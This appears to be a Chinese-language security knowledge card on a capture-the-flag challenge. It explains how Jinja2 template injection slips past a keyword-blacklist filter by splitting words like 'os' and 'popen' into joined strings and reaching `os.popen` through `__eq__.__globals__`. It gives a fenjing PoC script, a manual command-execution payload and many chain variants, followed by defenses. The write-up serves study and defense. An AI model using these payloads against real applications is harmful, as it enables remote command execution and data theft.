---
id: web-generic-ssti-waf-string-concat-eq-globals-bypass
title: SSTI WAF 关键字拆分绕过：字符串拼接 + __eq__ 取 globals + os.popen 读文件
type: scenario
domain: web
path: web/generic/ssti
technique: ssti-waf-string-concat-eq-globals-bypass
aliases:
- SSTI WAF 绕过
- Jinja2 关键字拆分
- __eq__ 绕过
- __globals__ 拆分
- fenjing
- dariy
tags:
- web
- ssti
- jinja2
- waf-bypass
- string-concat
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:04+08:00'
  notes: 已对照原文dariy段与图08核对：WAF黑名单os/popen/open/__globals__、fenjing生成与手工payload的字符串拆分（'o''s'/'po''pen'/'_''_globals__'）、__eq__取globals、cat /f*与flag{SST1_1s_d4nger0us_1n_J1nj4!}均一致。未验证点：PoC未本机复跑；frontmatter无sources/source_url。
---

## 一句话结论

当 Jinja2 SSTI 被 WAF 黑名单（如 `os`、`popen`、`open`、`__globals__`）拦截时，可以把关键字拆成相邻字符串字面量（`'o''s'`、`'po''pen'`、`'_''_globals__'`），用 `__eq__` 等内置方法取得函数对象，再经 `__globals__`→`sys.modules` 调用 `os.popen` 执行命令；本题用 fenjing 生成 payload 读取 `/f*`。

## 原理

- **Jinja2 表达式**：`{{ ... }}` 内可访问对象属性/下标、调用方法；`OvO.__eq__` 是绑定方法，其 `__globals__` 指向定义该函数的模块全局命名空间，从中可拿到 `sys`/`os` 等模块。
- **字符串字面量拼接**：Python/Jinja2 中相邻字符串字面量会自动拼接，`'o''s'` 在运行时等于 `'os'`，但源码/请求中不含连续 `os`；同理 `'po''pen'`、`'_''_globals__'` 可绕过子串黑名单。
- **属性/下标访问**：`OvO.__eq__['_''_globals__']` 等价于 `OvO.__eq__.__globals__`；`['sys']`、`['modules']`、`['o''s']` 逐层取模块；`['po''pen']` 取函数并调用。
- **为什么用 `__eq__`**：某些 WAF 会拦截 `__class__`/`__mro__`/`__subclasses__`/`__globals__` 等常见链；`__eq__` 是普通 dunder 方法，同样能拿到函数对象的 globals，且不在黑名单中。
- **fenjing**：自动化 SSTI 工具会根据 WAF 函数（输入字符串是否通过）搜索可用 payload；本题 WAF 黑名单为 `os/popen/open/__globals__`，fenjing 生成上述拆分 payload。
- **边界**：不同模板引擎/沙箱限制不同；若 `__globals__` 被彻底禁用、Jinja2 沙箱开启、或 `os` 模块不可达，需要换链（`cycler`/`lipsum`/`request.application` 等）。

## 触发条件

- 存在 Jinja2（或类似 Python 模板）SSTI，用户输入进入模板表达式。
- WAF/黑名单只做简单子串匹配，未做 AST/语义检测；关键字可拆分/编码。
- 模板上下文可访问对象（如 `OvO`、`config`、`request`、`cycler`、`lipsum` 等）。
- 目标有可执行命令的模块（`os`/`subprocess`）且未被沙箱禁用。

## 利用步骤

1. 确认 SSTI：提交 `{{7*7}}`/`{{config}}` 观察求值；用 `{{''.__class__}}` 等探测沙箱。
2. 识别 WAF 黑名单：逐个提交 `os`/`popen`/`open`/`__globals__`，观察拦截/回显差异。
3. 用字符串拼接拆分关键字：`'o''s'`、`'po''pen'`、`'_''_globals__'`；用 `__eq__`/其他 dunder 取函数 globals。
4. 构造链：`OvO.__eq__['_''_globals__']['sys']['modules']['o''s']['po''pen']('cat /f*')`，读取返回。
5. 或用 fenjing：定义 `waf(s)` 黑名单函数，调用 `exec_cmd_payload(waf, "cat /f*")` 自动搜索 payload。
6. 本题 payload 执行 `cat /f*`，页面 Recent Entries 显示 `flag{SST1_1s_d4nger0us_1n_J1nj4!}`。

## PoC

```python
from fenjing import exec_cmd_payload
import logging
logging.basicConfig(level=logging.INFO)

def waf(s: str):
    blacklist = ['os', 'popen', 'open', '__globals__']
    return all(word not in s for word in blacklist)

shell_payload, _ = exec_cmd_payload(waf, "cat /f*")
print(shell_payload)
```

手工 payload：

```jinja2
{{(OvO.__eq__['_''_globals__'].sys.modules['o''s']['po''pen']('cat /f*')).read()}}
```

## 变体与关联

- **变体（关键字拆分）**：`'o'+'s'`、`request.args.x`、`|attr('__globals__')`、`['__glo'+'bals__']`、Unicode 转义、大小写。
- **变体（链起点）**：`''.__class__.__mro__`、`config.__class__`、`cycler.__init__.__globals__`、`lipsum.__globals__`、`request.application.__globals__`。
- **变体（命令执行）**：`os.popen`、`os.system`、`subprocess.Popen`、`eval`、`builtins.__import__`。
- **关联卡片**：[[web-generic-ssti-engine-identification-decision-tree-errors]]（引擎识别）、[[web-generic-ssti-error-message-exfiltration]]（报错外带）、[[web-generic-ssti-twig-filter-map-reduce-callback-rce]]（Twig 链）。
- **边界**：Jinja2 SandboxedEnvironment、`__globals__` 禁用、AST WAF、无对象可达时失效；命令回显可能被过滤，需外带。

## 检测与防御

- **不要拼接用户输入到模板**：使用固定模板 + 参数渲染；对用户输入做转义/白名单。
- **沙箱**：使用 `SandboxedEnvironment`、禁用危险属性/方法；不要把 `config`/`request` 等对象暴露给不可信模板。
- **WAF**：不要只做关键字黑名单；用 AST/语义检测、限制表达式长度/字符集；但 WAF 不能替代沙箱。
- **检测**：监控 `{{`/`}}`、`__globals__`、`__eq__`、`os`/`popen` 拆分模式；模板渲染异常/命令执行痕迹。
